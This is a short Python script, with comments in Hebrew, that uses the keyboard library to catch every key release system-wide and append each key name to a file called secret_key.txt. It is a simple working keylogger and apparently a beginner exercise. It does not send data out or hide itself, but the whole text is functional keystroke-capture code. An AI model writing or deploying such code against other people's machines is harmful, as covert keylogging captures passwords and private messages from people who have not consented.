import keyboard


out_file = open("secret_key.txt", "w") # יוצר קובץ חדש 

def new_key(event):
    print(event.name)
    if event.name == "space":
        out_file.write(" ")
    else:
        out_file.write(event.name)
    out_file.flush()


keyboard.on_release(callback=new_key) # שמקש נלחץ תקרא לפונקציה new key
keyboard.wait()